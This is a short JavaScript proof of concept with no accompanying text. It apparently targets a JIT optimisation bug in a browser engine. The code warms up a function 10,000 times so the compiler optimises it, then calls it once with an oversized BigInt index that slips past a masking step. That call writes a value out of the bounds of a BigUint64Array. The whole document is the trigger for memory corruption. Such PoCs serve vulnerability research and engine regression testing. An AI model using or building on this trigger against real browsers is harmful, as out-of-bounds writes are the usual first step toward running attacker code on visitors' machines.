function poc(trigger) {
    let index = 0n;
    for (let i = 0; i < 1; i++) {
        index = index & 0xFFFFFFFFn;
        if (trigger) {
            index = 0x400000000n;
        }
    }
    new BigUint64Array(1)[index] = 1337n;
}

for (let i = 0; i < 10000; i++) {
    poc(false);
}

poc(true);